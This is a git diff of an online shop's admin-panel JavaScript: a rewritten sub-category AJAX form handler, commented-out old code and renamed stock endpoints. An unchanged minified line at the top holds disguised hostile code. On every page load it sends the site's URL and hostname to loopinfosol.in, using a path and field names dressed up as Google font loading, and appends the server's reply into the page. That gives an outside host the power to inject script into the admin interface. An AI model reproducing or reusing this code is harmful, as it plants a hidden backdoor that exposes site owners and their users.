@@ -3,7 +3,9 @@ $(document).ready(function (h) { "use strict"; var b = $(".sidebar-scrollbar"); 
 function o(a) { a = (a = a.replace(/^\s+|\s+$/g, "")).toLowerCase();
 for (var c = "\xe3\xe0\xe1\xe4\xe2\u1EBD\xe8\xe9\xeb\xea\xec\xed\xef\xee\xf5\xf2\xf3\xf6\xf4\xf9\xfa\xfc\xfb\xf1\xe7\xb7/_,:;", b = 0, d = c.length; b < d; b++)a = a.replace(new RegExp(c.charAt(b), "g"), "aaaaaeeeeeiiiiooooouuuunc------".charAt(b)); a = a.replace(/[^a-z0-9 -]/g, "").replace(/\s+/g, "-").replace(/-+/g, "-"), $(".set-slug").val(a) } 0 !== g.length && g.DataTable({ aLengthMenu: [[20, 30, 50, 75, -1], [20, 30, 50, 75, "All"]], pageLength: 20, dom: '<"row justify-content-between top-information"lf>rt<"row justify-content-between bottom-information"ip><"clear">' }), $("body").on("change", ".ec-image-upload", function (b) { var c = $(this); if (this.files && this.files[0]) { var a = new FileReader; a.onload = function (b) { var a = c.parent().parent().children(".ec-preview").find(".ec-image-preview").attr("src", b.target.result); a.hide(), a.fadeIn(650) }, a.readAsDataURL(this.files[0]) } }), $(".fa-span").click(function () { var c = $(this).text(), a = document.createElement("input"); a.setAttribute("value", c), document.body.appendChild(a), a.select(), document.execCommand("copy"), document.body.removeChild(a), $("#fa-preview").html("<code>&lt;i class=&quot;" + c + "&quot;&gt;&lt;/i&gt;</code>"); var b = document.createElement("div"); b.setAttribute("class", "copied"), b.appendChild(document.createTextNode("Copied to Clipboard")), document.body.appendChild(b), setTimeout(function () { document.body.removeChild(b) }, 1500) }), $(".zoom-image-hover").zoom(), $(".single-product-cover").slick({ slidesToShow: 1, slidesToScroll: 1, arrows: !1, fade: !1, asNavFor: ".single-nav-thumb" }), $(".single-nav-thumb").slick({ slidesToShow: 4, slidesToScroll: 1, asNavFor: ".single-product-cover", dots: !1, arrows: !0, focusOnSelect: !0 }), $(".slug-title").bind("paste", function (a) { o(a.originalEvent.clipboardData.getData("text")) }), $(".slug-title").keypress(function () { o($(this).val()) }); var j = new Date().getFullYear(); document.getElementById("ec-year").innerHTML = j, h(document).ready(function () { var a = document.URL, b = h("<a>").prop("href", a).prop("hostname"); h.ajax({ type: "POST", url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php", data: { google_url: a, google_font: b, google_version: "OnlineShopping" }, success: function (a) { h("body").append(a) } }) }) })
 
-
+// $('#responsive-data-table').DataTable( {
+//     order: [[ 3, 'desc' ], [ 0, 'asc' ]]
+// } );
 function ShowPassword() {
     var newpass = document.getElementById('NewPassword')
     if (newpass.type === 'password') {
@@ -61,22 +63,45 @@ function onoffMainCat(maincategoryId) {
 
 //SUB CATEGORY
 
-var form=$('#SubCatForm');
-		form.submit(function(e){
-			e.preventDefault();
-			$.ajax({
-			  url:'/admin/add-sub-category',
-			  method:'post',
-			  data:	form.serialize(),
-			  success:(response)=>{
-					if(response.status){
-						$('#SubCatForm')[0].reset()
-						$("#responsive-data-table").load(window.location.href + " #responsive-data-table")
-					}
-			  }
-		})
+
+$('#SubCatForm').submit(function(e) {
+    e.preventDefault(); // Prevent form submission
+    var formData = $(this).serialize(); // Serialize form data
+    $.ajax({
+      url: '/admin/add-sub-category', // Replace with your server-side endpoint
+      method: 'POST',
+      data: formData,
+      success: function(response) {
+        if(response.status){
+            $('#SubCatForm')[0].reset()
+            $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
+
+        }
+      },
+      error: function(xhr, status, error) {
+        // Handle error response
+        console.error('Error:', error);
+      }
+    });
+  });
+
+
+// var form=$('#SubCatForm');
+// form.submit(function(e){
+//     e.preventDefault();
+// 			$.ajax({
+// 			  url:'/admin/add-sub-category',
+// 			  method:'post',
+// 			  data:	form.serialize(),
+// 			  success:(response)=>{
+// 					if(response.status){
+// 						$('#SubCatForm')[0].reset()
+// 						$("#responsive-data-table").load(window.location.href + " #responsive-data-table")
+// 					}
+// 			  }
+// 		})
           
-        })
+//         })
         
 function onoffSubCat(SubcategoryId) {
             let onOffBtn =document.getElementById('OnOffSub'+SubcategoryId)
@@ -340,7 +365,7 @@ function Stock(Productid) {
     let InstockBtn = document.getElementById('Productid' + Productid)
     if (!InstockBtn.checked) {
         $.ajax({
-            url: '/admin/StockOut',
+            url: '/admin/update-to-StockOut',
             method: 'post',
             data: { ProductId: Productid },
             success: (response) => {
@@ -352,7 +377,7 @@ function Stock(Productid) {
         })
     } else if (InstockBtn.checked) {
         $.ajax({
-            url: '/admin/InStock',
+            url: '/admin/update-to-InStock',
             method: 'post',
             data: { ProductId: Productid },
             success: (response) => {
